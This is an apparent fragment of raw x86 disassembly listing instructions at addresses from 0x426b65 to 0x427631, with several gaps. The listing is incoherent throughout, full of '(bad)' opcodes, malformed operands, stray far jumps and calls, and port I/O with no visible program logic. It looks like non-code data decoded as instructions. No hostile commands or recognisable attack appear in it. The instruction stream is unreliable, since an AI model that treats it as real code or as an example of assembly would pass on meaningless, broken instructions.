  426b65:	aas    
  426b66:	(bad)  
  426b67:	cmp    al,0xfe
  426b69:	mov    ah,0x91
  426b6b:	sbb    dl,BYTE PTR [ebx+edx*1+0x5b]
  426b6f:	mov    eax,ds:0x72766f2a
  426b74:	std    
  426b75:	(bad)  
  426b76:	mov    ds:0x2506d550,eax
  426b7b:	ds ins DWORD PTR es:[edi],dx
  426b7d:	rol    DWORD PTR ds:0x3150c02f,1
  426b83:	xor    ebp,edx
  426b85:	fsubp  st(1),st
  426b87:	lock retf 
  426b89:	aas    
  426b8a:	imul   eax,DWORD PTR [ebp+0x32],0x2b52acd0
  426b91:	in     al,dx
  426b92:	repz jge 0x426b70
  426b95:	cli    
  426b96:	and    al,0xc
  426b98:	push   0xffffffff
  426b9a:	std    
  426b9b:	lock retf 0xafb0
  426b9f:	jne    0x426bb3
  426ba1:	push   edx
  426ba2:	retf   0xc7e1
  426ba5:	loope  0x426b89
  426ba7:	ret    
  426ba8:	loopne 0x426b63
  426baa:	sub    ebp,DWORD PTR cs:[ecx]
  426bad:	clc    
  426bae:	sbb    DWORD PTR [edi+0x67],ebx
  426bb1:	inc    edx
  426bb2:	pusha  
  426bb3:	pop    ebx
  426bb4:	call   FWORD PTR [edx+0x29dba82b]
  426bba:	push   esp
  426bbb:	mov    eax,ds:0xc28e495d
  426bc0:	xor    DWORD PTR [edx+0x43],ebx
  426bc3:	pop    eax
  426bc4:	xor    edi,eax
  426bc6:	ins    DWORD PTR es:[edi],dx
  426bc7:	dec    ecx
  426bc8:	gs std 
  426bca:	and    DWORD PTR [edi],esi
  426bcc:	outs   dx,DWORD PTR ds:[esi]
  426bcd:	das    
  426bce:	retf   
  426bcf:	leave  
  426bd0:	sub    cl,bl
  426bd2:	lock ficom DWORD PTR [esi+0x52dac01]
  426bd9:	inc    eax
  426bda:	mov    ecx,0x8be32831
  426bdf:	mov    edx,0x175e1cc8
  426be4:	adc    eax,DWORD PTR [edi+esi*4+0x3e]
  426be8:	js     0x426b6f
  426bea:	in     al,dx
  426beb:	adc    ebp,DWORD PTR [ebp+0x7f7b2db0]
  426bf1:	fdivr  DWORD PTR [ebx-0x727dbafe]
  426bf7:	es jae 0x426bc8
  426bfa:	cmp    DWORD PTR [edx],esi
  426bfc:	and    DWORD PTR [ecx],edx
  426bfe:	lea    ebx,[ecx-0x6a]
  426c01:	and    DWORD PTR [eax+edi*4+0x57],0xf74ad608
  426c09:	cmp    eax,0xd3af8c23
  426c0e:	xlat   BYTE PTR ds:[ebx]
  426c0f:	pop    ecx
	...
  426c74:	loop   0x426cd6
  426c76:	test   DWORD PTR [esi+0x74f3f787],esi
  426c7c:	mov    ah,0xeb
  426c7e:	cld    
  426c7f:	mov    edx,0x13731a72
  426c84:	add    BYTE PTR [esi+0x1040001],bl
  426c8a:	add    BYTE PTR [eax],al
  426c8c:	ret    0xbbca
  426c8f:	cwd    
  426c91:	push   0xe21ef2d3
  426c96:	call   0x599f:0xefc31724
  426c9d:	pop    es
  426c9e:	xchg   ebx,eax
  426c9f:	sub    eax,0xc0b965f6
  426ca4:	pusha  
  426ca5:	les    esi,FWORD PTR [edi+0x50]
  426ca8:	dec    edi
  426ca9:	dec    ecx
  426caa:	sub    al,0x28
  426cac:	push   ebx
  426cad:	ins    BYTE PTR es:[edi],dx
  426cae:	loopne 0x426d25
  426cb0:	fild   DWORD PTR [ebx+eax*1+0x6c]
  426cb4:	mov    edx,0xb8ceeeaa
  426cb9:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  426cba:	add    al,0x59
  426cbc:	push   edi
  426cbd:	jne    0x426ce5
  426cbf:	push   ds
  426cc0:	repnz pop eax
  426cc2:	lods   al,BYTE PTR ds:[esi]
  426cc3:	mov    ebx,?
  426cc5:	xchg   edx,eax
  426cc6:	dec    ebx
  426cc7:	(bad)  
  426cc8:	lahf   
  426cc9:	ins    BYTE PTR es:[edi],dx
  426cca:	push   es
  426ccb:	mov    esi,0x18ab69bd
  426cd0:	adc    eax,0xadfc7f1b
  426cd5:	jecxz  0x426cb2
  426cd7:	das    
  426cd8:	add    al,0xb0
  426cda:	sar    DWORD PTR [esi+esi*4],1
  426cdd:	sub    esp,DWORD PTR [edi-0x78]
  426ce0:	sub    ch,bl
  426ce2:	dec    esp
  426ce3:	cmc    
  426ce4:	mov    ds:0x1fab4c4e,al
  426ce9:	fs dec eax
  426ceb:	(bad)  
  426cec:	mov    es:0xf215465e,al
  426cf2:	push   ebp
  426cf3:	xchg   BYTE PTR [edx+0x5d2c7063],dh
  426cf9:	xor    dh,BYTE PTR [eax-0x70f1f192]
  426cff:	mov    esi,0xe86277e5
  426d04:	adc    bh,BYTE PTR [esi-0x2a]
  426d07:	dec    edx
  426d08:	cmc    
  426d09:	(bad)  
  426d0a:	push   esp
  426d0b:	imul   edi,ebp,0x5e
  426d0e:	jne    0x426ce0
  426d10:	dec    ecx
  426d11:	cmp    ah,BYTE PTR [ebp-0x15]
  426d14:	addr16 mov edi,0x86b44b12
  426d1a:	into   
  426d1b:	xor    ch,ch
  426d1d:	push   es
  426d1e:	or     al,0x27
  426d20:	loopne 0x426d06
  426d22:	jne    0x426d79
  426d24:	pop    ebx
  426d25:	push   ss
  426d26:	xor    ebp,DWORD PTR [edi]
  426d28:	pop    ecx
  426d29:	fdivr  DWORD PTR [ebx-0x5adbad65]
  426d2f:	sub    BYTE PTR [ecx+0x33a17258],bl
  426d35:	inc    edx
  426d36:	pop    ebp
  426d37:	scas   eax,DWORD PTR es:[edi]
  426d38:	retf   
  426d39:	pop    eax
  426d3a:	rol    BYTE PTR [edi+0x3c],cl
  426d3d:	rcl    BYTE PTR [eax-0x25],cl
  426d40:	ror    BYTE PTR [esi-0x2c],0xbc
  426d44:	arpl   WORD PTR [ebp-0x7491ad5f],ax
  426d4a:	sbb    ebx,DWORD PTR cs:[edi+0x5b8b4bfd]
  426d51:	cmp    al,0xc5
  426d53:	sbb    ebx,DWORD PTR [esi+esi*1+0xa]
  426d57:	mov    esi,0x235d2f7e
  426d5c:	dec    ebp
  426d5d:	inc    ebx
  426d5e:	das    
  426d5f:	sub    eax,0x6346078d
  426d64:	loop   0x426d28
  426d66:	gs adc BYTE PTR es:0xb43f29c7,bl
  426d6e:	mov    dh,0xa5
  426d70:	scas   al,BYTE PTR es:[edi]
  426d71:	sub    ah,cl
  426d73:	ret    
  426d74:	cmp    al,0x71
  426d76:	fisubr WORD PTR [edi+0x1ac366cc]
  426d7c:	dec    edx
  426d7d:	out    dx,eax
  426d7e:	pop    ebp
  426d7f:	hlt    
  426d80:	jp     0x426de6
  426d82:	dec    esp
  426d83:	pop    es
  426d84:	push   es
  426d85:	xchg   ecx,eax
  426d86:	push   eax
  426d87:	adc    bh,BYTE PTR [eax-0x24b80d97]
  426d8d:	sahf   
  426d8e:	retf   0xc5
	...
  426df1:	add    BYTE PTR [eax],al
  426df3:	add    BYTE PTR [edx],cl
  426df5:	mov    cl,0x61
  426df7:	repz sti 
  426df9:	repz call 0x440c:0xc7c2ecf9
  426e01:	or     DWORD PTR [ecx+0x2c],edx
  426e04:	add    al,0x9f
  426e06:	add    DWORD PTR [eax],eax
  426e08:	add    al,0x1
  426e0a:	add    BYTE PTR [eax],al
  426e0c:	stc    
  426e0d:	mov    esi,cs
  426e0f:	jmp    0x3afb:0x8392979d
  426e16:	std    
  426e17:	aad    0x1e
  426e19:	inc    esp
  426e1a:	push   ss
  426e1b:	xor    esi,0x32
  426e1e:	gs int3 
  426e20:	xlat   BYTE PTR ds:[ebx]
  426e21:	cmp    BYTE PTR [esi-0x18bb1923],bl
  426e27:	fidivr WORD PTR [eax+0x248fa882]
  426e2d:	or     al,0xe1
  426e2f:	scas   al,BYTE PTR es:[edi]
  426e30:	out    0xf7,al
  426e32:	or     ah,BYTE PTR ds:0x75f3492c
  426e38:	and    DWORD PTR ds:0x7c6d3e3e,ebx
  426e3e:	jae    0x426e30
  426e40:	hlt    
  426e41:	dec    ebx
  426e42:	call   DWORD PTR [ecx]
  426e44:	and    DWORD PTR es:[edx+0x3398b3ea],esi
  426e4b:	cmp    DWORD PTR [eax+0x1109e8e9],ebp
  426e51:	dec    ebp
  426e52:	push   0x5d
  426e54:	mov    ?,WORD PTR [ecx+0x6d]
  426e57:	cli    
  426e58:	push   ss
  426e59:	stos   DWORD PTR es:[edi],eax
  426e5a:	and    al,0x79
  426e5c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  426e5d:	mov    al,ds:0x60486d1b
  426e62:	xchg   edi,eax
  426e63:	fsub   QWORD PTR [esi-0x7a]
  426e66:	push   cs
  426e67:	add    dl,BYTE PTR [edi+esi*2+0x59b2c45c]
  426e6e:	pushf  
  426e6f:	scas   al,BYTE PTR es:[edi]
  426e70:	leave  
  426e71:	clc    
  426e72:	mov    ds:0xda37fc0d,eax
  426e77:	mov    eax,ds:0xe11ec35b
  426e7c:	mov    edi,0x378f7ff5
  426e81:	jo     0x426e8b
  426e83:	aad    0x83
  426e85:	ss out 0xfc,eax
  426e88:	fxch   st(3)
  426e8a:	retf   0xcea
  426e8d:	ins    DWORD PTR es:[edi],dx
  426e8e:	stos   BYTE PTR es:[edi],al
  426e8f:	sub    al,0x29
  426e91:	sbb    cl,BYTE PTR [ecx-0x3f]
  426e94:	scas   al,BYTE PTR es:[edi]
  426e95:	imul   ebx,ebp,0xec2381e3
  426e9b:	fnstenv [edi+0x6f26f5f4]
  426ea1:	out    0xcc,al
  426ea3:	push   esi
  426ea4:	or     dh,ah
  426ea6:	gs and ch,bh
  426ea9:	jnp    0x426ed7
  426eab:	xchg   ebp,eax
  426eac:	push   ss
  426ead:	mov    ebp,0x45ed0c0c
  426eb2:	dec    eax
  426eb3:	cmp    BYTE PTR [ecx],0xfb
  426eb6:	xchg   edi,eax
  426eb7:	je     0x426e98
  426eb9:	jbe    0x426edc
  426ebb:	dec    ah
  426ebd:	xchg   WORD PTR [ebp-0x43],di
  426ec1:	sbb    al,0x3b
  426ec3:	aaa    
  426ec4:	mov    esi,0x3e7afc0d
  426ec9:	sahf   
  426eca:	mov    eax,ds:0x1a818b6c
  426ecf:	dec    edx
  426ed0:	sub    DWORD PTR [eax-0x6d],esp
  426ed3:	cmc    
  426ed4:	push   ds
  426ed5:	cmp    BYTE PTR [ecx-0x25bdacf1],al
  426edb:	adc    BYTE PTR [ebp+eiz*2-0x49],bl
  426edf:	sbb    eax,0x33ddfb89
  426ee4:	xchg   ebx,eax
  426ee5:	(bad)  
  426ee7:	clc    
  426ee8:	mov    bh,0x8
  426eea:	(bad)  
  426eeb:	mov    edx,0xb8cadcb5
  426ef0:	mov    bl,0xab
  426ef2:	in     eax,0xe4
  426ef4:	pushf  
  426ef5:	and    ebp,DWORD PTR [edx]
  426ef7:	fisubr WORD PTR [ebp-0x5003dc73]
  426efd:	xor    cl,BYTE PTR [eax-0x365efd8d]
  426f03:	cmp    DWORD PTR [edx-0x8beff11],esp
  426f09:	repz and eax,0xac4c4e2c
  426f0f:	mov    cl,0x0
	...
  426f71:	add    BYTE PTR [eax],al
  426f73:	add    BYTE PTR [edx+eiz*4-0xa380e39],ah
  426f7a:	mov    dh,0xf7
  426f7c:	inc    edi
  426f7d:	inc    ecx
  426f7e:	add    DWORD PTR [esp+eax*1+0x8fc07cd],esp
  426f85:	mov    al,ds:0x1040001
  426f8a:	add    BYTE PTR [eax],al
  426f8c:	push   0x38
  426f8e:	aas    
  426f8f:	push   esp
  426f90:	adc    eax,0x5b0bbe21
  426f95:	jge    0x426f4a
  426f97:	sub    DWORD PTR [edi],edx
  426f99:	inc    edx
  426f9a:	and    DWORD PTR [eax+0x5],0xac1ec2ef
  426fa1:	repz sbb esi,DWORD PTR [edi+ebx*8+0x45]
  426fa6:	jbe    0x426f2c
  426fa8:	rcr    DWORD PTR [ebx+0x4c],1
  426fab:	rcr    BYTE PTR [ebx-0x4c],0xec
  426faf:	add    eax,0x26629dad
  426fb4:	mov    al,0xa9
  426fb6:	call   0x85154cb2
  426fbb:	gs jae 0x427031
  426fbe:	mov    edx,0xb119b80d
  426fc3:	add    al,0xc6
  426fc5:	or     bh,dl
  426fc7:	mov    ah,0x10
  426fc9:	int    0x1f
  426fcb:	ret    0x4ed0
  426fce:	sub    edx,DWORD PTR [edi]
  426fd0:	xchg   esp,eax
  426fd1:	int    0x8a
  426fd3:	push   ecx
  426fd4:	ret    0x70c0
  426fd7:	shl    BYTE PTR [eax-0x7cab746c],0xb8
  426fde:	add    DWORD PTR [eax-0x9449d95],eax
  426fe4:	daa    
  426fe5:	pushf  
  426fe6:	xchg   edx,eax
  426fe7:	xor    eax,0x73dedbf4
  426fec:	div    DWORD PTR [esi+0x26]
  426fef:	xchg   esi,eax
  426ff0:	clc    
  426ff1:	jns    0x426fc5
  426ff3:	adc    eax,0x5814b614
  426ff8:	mov    ch,0xad
  426ffa:	pop    ebp
  426ffb:	pop    esp
  426ffc:	lock setp BYTE PTR [ebx+ebx*2]
  427001:	lds    esp,FWORD PTR [esi+0x2efd954e]
  427007:	sbb    al,0xdf
  427009:	ret    0x30ed
  42700c:	call   0xea39:0xc9095235
  427013:	mov    ah,0xd1
  427015:	ss and al,0x46
  427018:	stos   BYTE PTR es:[edi],al
  427019:	(bad)  
  42701a:	sti    
  42701b:	mov    ch,0xee
  42701d:	jmp    0x426fc5
  42701f:	not    BYTE PTR [ecx+0x4c1800f7]
  427025:	mov    eax,ds:0x775bef86
  42702a:	mov    ds:0x41091943,al
  42702f:	mov    WORD PTR [edi-0x7f05ae66],cs
  427035:	pop    ds
  427036:	pop    ecx
  427037:	shl    DWORD PTR [edx+0x50c6edf7],1
  42703d:	cld    
  42703e:	cmp    BYTE PTR [eax-0x7891ca9f],bl
  427044:	push   ebx
  427045:	pushf  
  427046:	repnz mov BYTE PTR [edx-0xec9729c],ah
  42704d:	pop    ebx
  42704e:	mov    ds:0x7e6962b1,eax
  427053:	lods   al,BYTE PTR ds:[esi]
  427054:	inc    ecx
  427055:	les    ebp,FWORD PTR [esi-0x53]
  427058:	push   0x8627435d
  42705d:	loope  0x427010
  42705f:	push   ebp
  427060:	sbb    DWORD PTR [esi+esi*2+0x23],edi
  427064:	inc    edx
  427065:	cmp    DWORD PTR [esi+0xd54a8ea],ebx
  42706b:	pop    edi
  42706c:	adc    ah,bh
  42706e:	stos   DWORD PTR es:[edi],eax
  42706f:	push   cs
  427070:	mov    al,0x6e
  427072:	cmp    dh,BYTE PTR [eax]
  427074:	xor    DWORD PTR [edi+0x53],ebx
  427077:	aas    
  427078:	pushf  
  427079:	mov    ebx,0xb11a414a
  42707e:	mov    ecx,0xe0414fd0
  427083:	and    edx,esi
  427085:	(bad)  
  427086:	dec    eax
  427087:	dec    edx
  427088:	and    eax,0x97870a2e
  42708d:	outs   dx,BYTE PTR ds:[esi]
  42708e:	jmp    DWORD PTR [esi+0x0]
	...
  4270f1:	add    BYTE PTR [eax],al
  4270f3:	add    BYTE PTR [ebp*2-0x8846ae6],cl
  4270fa:	(bad)  
  4270fb:	std    
  4270fc:	inc    esp
  4270fd:	mov    ebp,0xd1889d96
  427102:	ret    0xc9f
  427105:	mov    eax,ds:0x1040001
  42710a:	add    BYTE PTR [eax],al
  42710c:	jmp    0x5eac:0xc40731d3
  427113:	imul   ebp,DWORD PTR [ecx+0x38],0x24
  427117:	mov    eax,ds:0x24d2acf5
  42711c:	(bad)  
  42711d:	mov    edx,0x23b5384d
  427122:	pop    esp
  427123:	sbb    BYTE PTR [edi-0x726cd421],dh
  427129:	(bad)  
  42712a:	push   ss
  42712b:	iret   
  42712c:	or     DWORD PTR [ecx-0x6daf64aa],0x9d1abe49
  427136:	mov    dh,0x33
  427138:	cld    
  427139:	mov    ds:0x8583c4bd,al
  42713e:	add    eax,0x5121e350
  427143:	mov    ebp,0x9d2c8e27
  427148:	push   edi
  427149:	jae    0x427121
  42714b:	aam    0x4b
  42714d:	fsub   st(3),st
  42714f:	and    BYTE PTR [edx],dh
  427151:	jne    0x42713d
  427153:	pop    esi
  427154:	lea    edx,[ebx-0x34]
  427157:	lods   eax,DWORD PTR ds:[esi]
  427158:	ror    al,0xf3
  42715b:	sbb    cl,BYTE PTR [edi-0x6dda689]
  427161:	sbb    bl,BYTE PTR [ecx]
  427163:	adc    eax,0xaada6c48
  427168:	or     al,0xea
  42716a:	ss pop esi
  42716c:	jb     0x427163
  42716e:	mov    BYTE PTR [eax+ebx*1-0x743c4d87],bh
  427175:	rcl    DWORD PTR [eax-0x713acddb],0x4b
  42717c:	retf   
  42717d:	dec    esi
  42717e:	dec    esp
  42717f:	outs   dx,BYTE PTR ds:[esi]
  427180:	jae    0x42711b
  427182:	(bad)  
  427184:	in     eax,dx
  427185:	jle    0x42714d
  427187:	stos   BYTE PTR es:[edi],al
  427188:	and    ebp,DWORD PTR [ecx]
  42718a:	retf   0x27ca
  42718d:	test   al,0x38
  42718f:	sbb    al,0xf5
  427191:	mov    ds:0x33e14bf6,eax
  427196:	lea    esp,[ebx-0x11]
  427199:	pop    ecx
  42719a:	lods   al,BYTE PTR ds:[esi]
  42719b:	mov    eax,ds:0x1438c642
  4271a0:	jg     0x427125
  4271a2:	cmp    ah,BYTE PTR [edx+0x8]
  4271a5:	push   edx
  4271a6:	scas   eax,DWORD PTR es:[edi]
  4271a7:	jmp    FWORD PTR [esi+0x55d2f2f9]
  4271ad:	loopne 0x42718b
  4271af:	jb     0x427142
  4271b1:	sbb    eax,0x3f346a22
  4271b6:	sub    bh,BYTE PTR ss:[edx]
  4271b9:	dec    edi
  4271ba:	lods   al,BYTE PTR ds:[esi]
  4271bb:	dec    esp
  4271bc:	mov    ecx,0xc5f473e8
  4271c1:	lahf   
  4271c2:	lea    ebp,[ebx]
  4271c4:	or     eax,0x69c0919e
  4271c9:	sbb    DWORD PTR [edi-0x2d575376],0x15
  4271d0:	sub    eax,0xee555333
  4271d5:	out    dx,eax
  4271d6:	push   ebp
  4271d7:	mov    al,ch
  4271d9:	js     0x427163
  4271db:	sbb    ecx,DWORD PTR [ebp-0x64]
  4271de:	dec    ebx
  4271df:	xor    dh,BYTE PTR ds:0x3e775966
  4271e5:	imul   DWORD PTR [eax+0x75fefa36]
  4271eb:	neg    dl
  4271ed:	(bad)  
  4271ee:	mov    edi,0x8a66acfa
  4271f3:	sahf   
  4271f4:	enter  0x35c5,0x6e
  4271f8:	rol    cl,0x8d
  4271fb:	xchg   esi,eax
  4271fc:	pop    eax
  4271fd:	pop    esi
  4271fe:	into   
  4271ff:	imul   ebx,DWORD PTR [ebx-0x5748ffad],0x6618a912
  427209:	mov    al,0xd6
  42720b:	lods   al,BYTE PTR ds:[esi]
  42720c:	jne    0x427251
  42720e:	je     0x4271e0
	...
  427274:	push   ds
  427275:	inc    ecx
  427276:	fdiv   QWORD PTR [edi+ebx*8-0x7e148143]
  42727d:	push   ecx
  42727e:	dec    ebp
  42727f:	mov    ds:0x6f49882c,al
  427284:	adc    BYTE PTR [edx+0x1040001],ah
  42728a:	add    BYTE PTR [eax],al
  42728c:	not    bh
  42728e:	iret   
  42728f:	lods   al,BYTE PTR ds:[esi]
  427290:	and    bl,cl
  427292:	or     BYTE PTR [ebp+0x1b],cl
  427295:	or     cl,bl
  427297:	sub    BYTE PTR [edi+0x2923ed03],0x74
  42729e:	cmp    esi,DWORD PTR [ecx-0x21ec7ade]
  4272a4:	js     0x427290
  4272a6:	xchg   DWORD PTR [esi-0x1b80f33],eax
  4272ac:	inc    esp
  4272ad:	add    al,0xe2
  4272af:	into   
  4272b0:	out    dx,al
  4272b1:	iret   
  4272b2:	in     al,0x19
  4272b4:	xchg   edx,eax
  4272b5:	sbb    ebx,DWORD PTR [esi]
  4272b7:	lds    ecx,FWORD PTR [ecx-0x671b4494]
  4272bd:	ffreep st(1)
  4272bf:	jbe    0x4272c9
  4272c1:	push   ecx
  4272c2:	dec    esi
  4272c3:	test   eax,0xdacbdffe
  4272c8:	push   0xe3ec1260
  4272cd:	pop    ds
  4272ce:	cld    
  4272cf:	into   
  4272d0:	jne    0x4272bb
  4272d2:	es ins BYTE PTR es:[edi],dx
  4272d4:	es cdq 
  4272d6:	retf   
  4272d7:	mov    cl,0x18
  4272d9:	inc    esi
  4272da:	xor    ch,BYTE PTR [eax-0x54df402d]
  4272e0:	and    al,0x98
  4272e2:	mov    DWORD PTR ds:0xd3c65d45,ebp
  4272e8:	std    
  4272e9:	(bad)  ds:0xef65ed05
  4272ef:	mov    dh,0x83
  4272f1:	out    0xfa,al
  4272f3:	jmp    0x98e0e879
  4272f8:	fbld   TBYTE PTR [edi-0x3c314afa]
  4272fe:	ins    DWORD PTR es:[edi],dx
  4272ff:	fwait
  427300:	ins    BYTE PTR es:[edi],dx
  427301:	into   
  427302:	pop    eax
  427303:	push   edx
  427304:	mov    ebx,0x735558a2
  427309:	mov    ds:0x4a34db35,al
  42730e:	je     0x427293
  427310:	jge    0x4272ec
  427312:	dec    edx
  427313:	(bad)  [esi-0x7213d9ee]
  427319:	out    dx,eax
  42731a:	mov    ecx,0x93d13df0
  42731f:	mov    ebp,0x863ddae7
  427324:	je     0x4272cc
  427326:	and    BYTE PTR [ecx-0x340ca165],bl
  42732c:	xor    dl,0xa2
  42732f:	adc    BYTE PTR [ebx],cl
  427331:	ret    0x2937
  427334:	push   edi
  427335:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427336:	aam    0x45
  427338:	out    0x89,eax
  42733a:	cmp    BYTE PTR [eax+0x3],bl
  42733d:	cli    
  42733e:	mov    ds:0x98ddcdcb,al
  427343:	and    edi,edx
  427345:	loop   0x42732e
  427347:	inc    ebx
  427348:	jl     0x4272e6
  42734a:	push   cs
  42734b:	popf   
  42734c:	stos   BYTE PTR es:[edi],al
  42734d:	shl    DWORD PTR [ecx+0x5e],1
  427350:	fisubr WORD PTR [ecx]
  427352:	mov    DWORD PTR [edx-0x45378e80],esp
  427358:	jnp    0x42738c
  42735a:	inc    ebx
  42735b:	xor    edx,eax
  42735d:	call   0xc54d8825
  427362:	call   DWORD PTR [esi-0x79]
  427365:	test   DWORD PTR [edx],ebx
  427367:	and    BYTE PTR [esp+ebp*8+0x2c],dl
  42736b:	fdivr  QWORD PTR [ebx+0x14]
  42736e:	xchg   ebp,eax
  42736f:	mov    bh,0xf3
  427371:	jno    0x4272f3
  427373:	inc    eax
  427374:	lds    ebp,FWORD PTR [edx]
  427376:	ror    BYTE PTR [ecx-0x7bfba27f],cl
  42737c:	gs pop es
  42737e:	sub    DWORD PTR [eax-0x5a],esp
  427381:	lods   al,BYTE PTR ds:[esi]
  427382:	mov    esi,0x4503a538
  427387:	and    ecx,esi
  427389:	lea    edi,[edx]
  42738b:	clc    
  42738c:	sbb    bl,BYTE PTR [ebx+eiz*2-0xb]
	...
  4273f4:	adc    bl,BYTE PTR ds:0xaf3f8832
  4273fa:	mov    edx,0x29f0389f
  4273ff:	sbb    ebp,DWORD PTR [ebp-0x7d]
  427402:	xor    ch,BYTE PTR [edi]
  427404:	adc    al,0xa3
  427406:	add    DWORD PTR [eax],eax
  427408:	add    al,0x1
  42740a:	add    BYTE PTR [eax],al
  42740c:	dec    esp
  42740d:	fwait
  42740e:	fs cs push eax
  427411:	sub    eax,0x16cece49
  427416:	cld    
  427417:	jns    0x4273bf
  427419:	xor    DWORD PTR [edi],edi
  42741b:	loope  0x4273f0
  42741d:	mov    bh,0x90
  42741f:	mov    BYTE PTR [ebx-0x10d32cb6],dh
  427425:	ror    DWORD PTR [edi+ebp*1],0x6c
  427429:	or     BYTE PTR ss:[edx],bh
  42742c:	xor    DWORD PTR [ebp+0x1f5324f7],ecx
  427432:	sbb    ah,BYTE PTR [edx-0x19]
  427435:	sub    al,BYTE PTR [ecx]
  427437:	fmul   QWORD PTR [eax]
  427439:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  42743a:	adc    eax,0xb0fd45b9
  42743f:	mov    BYTE PTR [ebp-0x7000236a],dl
  427445:	mov    bh,0xe7
  427447:	leave  
  427448:	sbb    al,0x3
  42744a:	cwde   
  42744b:	mov    gs,WORD PTR [eax+edi*4]
  42744e:	(bad)  
  427450:	inc    edi
  427451:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  427452:	cs (bad) 
  427455:	jae    0x427443
  427457:	out    0xae,al
  427459:	inc    ebp
  42745a:	add    DWORD PTR [edx],0xac068363
  427460:	ss push ebp
  427462:	jno    0x42747d
  427464:	sbb    DWORD PTR [ebx],0x5304afb2
  42746a:	call   0xd7c8e303
  42746f:	cs mov eax,0x3e8c07fd
  427475:	test   DWORD PTR ds:0xde403f8a,0x254d5ed6
  42747f:	(bad)  
  427480:	add    eax,0xa760d5c6
  427485:	popf   
  427486:	cld    
  427487:	and    al,BYTE PTR [edx-0x7643471f]
  42748d:	cmp    ebp,0x3b8ff923
  427493:	adc    eax,0x50005637
  427498:	mov    DWORD PTR [edx],edx
  42749a:	cmp    eax,0x7126d31c
  42749f:	pop    ebp
  4274a0:	push   esp
  4274a1:	imul   ecx,DWORD PTR ds:0x94a61873,0xd01f49cc
  4274ab:	push   ecx
  4274ac:	sub    eax,0xcc4c6650
  4274b1:	and    dl,BYTE PTR [esi-0x7a]
  4274b4:	adc    eax,0xc89d6095
  4274b9:	sbb    BYTE PTR [edi],bh
  4274bb:	shl    BYTE PTR [edx],cl
  4274bd:	fwait
  4274be:	lds    edi,FWORD PTR [esi-0x14]
  4274c1:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4274c2:	sub    ah,ah
  4274c4:	sbb    DWORD PTR [edi-0x39],edi
  4274c7:	mov    dh,ah
  4274c9:	lock fist WORD PTR [ebp+0x35]
  4274cd:	add    BYTE PTR [eax-0x3a],cl
  4274d0:	sar    BYTE PTR [edi+0x1d],0x9b
  4274d4:	(bad)  
  4274d5:	jmp    0xc0b5:0x7dc8daed
  4274dc:	dec    esp
  4274dd:	push   es
  4274de:	push   esp
  4274df:	mov    ds:0x5431c389,al
  4274e4:	push   ds
  4274e5:	mov    ch,0xad
  4274e7:	test   eax,0xb8a94086
  4274ec:	lea    esi,[ecx+edx*8-0x31]
  4274f0:	in     eax,0xa3
  4274f2:	sbb    ch,ah
  4274f4:	pop    ss
  4274f5:	mul    BYTE PTR [eax]
  4274f7:	add    esp,DWORD PTR [ecx]
  4274f9:	mov    ebx,0x941f6fd9
  4274fe:	adc    ebp,ebx
  427500:	jl     0x4274fb
  427502:	dec    esi
  427503:	jnp    0x4274b8
  427505:	repnz out 0x41,eax
  427508:	lahf   
  427509:	jae    0x427542
  42750b:	jo     0x427515
  42750d:	out    dx,al
  42750e:	test   eax,0x33
	...
  427573:	add    BYTE PTR [eax+ebp*4-0x40],bl
  427577:	stos   DWORD PTR es:[edi],eax
  427578:	hlt    
  427579:	jmp    0x4275fa
  42757b:	(bad)  
  42757c:	cmp    dh,BYTE PTR [esi]
  42757e:	jbe    0x4275ea
  427580:	test   al,0x53
  427582:	out    dx,al
  427583:	adc    ebx,DWORD PTR [eax]
  427585:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  427586:	add    DWORD PTR [eax],eax
  427588:	add    al,0x1
  42758a:	add    BYTE PTR [eax],al
  42758c:	dec    edx
  42758d:	mov    al,ds:0x8144a5bb
  427592:	cmp    BYTE PTR [edx-0x1f1381d1],ch
  427598:	(bad)  
  427599:	mov    ebx,0x1e618048
  42759e:	mov    ds:0xeb057065,al
  4275a3:	pushf  
  4275a4:	inc    eax
  4275a5:	dec    edi
  4275a6:	(bad)  
  4275a7:	mov    DWORD PTR [eax+edi*2],esi
  4275aa:	push   ecx
  4275ab:	pop    eax
  4275ac:	loopne 0x427619
  4275ae:	cmp    al,0xa8
  4275b0:	call   0xbc06:0xef2470b4
  4275b7:	in     al,dx
  4275b8:	daa    
  4275b9:	adc    DWORD PTR [ebp+0x816dbfe],edx
  4275bf:	mov    edi,0x316f3d9c
  4275c4:	(bad)  
  4275c5:	mov    ebp,0x1881920
  4275ca:	push   ds
  4275cb:	jae    0x427592
  4275cd:	ins    BYTE PTR es:[edi],dx
  4275ce:	aad    0x61
  4275d0:	inc    esp
  4275d1:	push   cs
  4275d2:	retf   0x6e98
  4275d5:	push   cs
  4275d6:	nop
  4275d7:	(bad)  
  4275d8:	sbb    BYTE PTR [ebx],ch
  4275da:	add    DWORD PTR [eax+0x4a],0xffffffff
  4275de:	ds cld 
  4275e0:	(bad)  
  4275e2:	jle    0x427564
  4275e4:	pop    ebp
  4275e5:	jb     0x427613
  4275e7:	xchg   edi,eax
  4275e8:	repnz arpl sp,sp
  4275eb:	inc    ebx
  4275ec:	cdq    
  4275ed:	or     BYTE PTR [eax-0x5e],cl
  4275f0:	inc    eax
  4275f1:	cmp    dl,BYTE PTR ds:0x60a5f60e
  4275f7:	or     BYTE PTR [edx+0x69],0x54
  4275fb:	cdq    
  4275fc:	adc    BYTE PTR [esi+0x3c],ah
  4275ff:	aam    0x4d
  427601:	cmp    al,0xde
  427603:	and    eax,0x1f85e1e8
  427608:	cmp    BYTE PTR [ebx],bl
  42760a:	jbe    0x427653
  42760c:	mov    ecx,0xe9a7b0ac
  427611:	sar    DWORD PTR [ecx-0x49],cl
  427614:	adc    BYTE PTR [ebp+0x3b],dl
  427617:	stos   DWORD PTR es:[edi],eax
  427618:	pushf  
  427619:	pop    esi
  42761a:	push   es
  42761b:	fsub   QWORD PTR [ecx-0x31896524]
  427621:	xlat   BYTE PTR ds:[ebx]
  427622:	adc    eax,0x7dd9ba20
  427627:	aad    0xc1
  427629:	sub    DWORD PTR [ebp+0x37],ebp
  42762c:	fdiv   DWORD PTR [esi-0x50]
  42762f:	xor    al,0x60
  427631:	push   cs
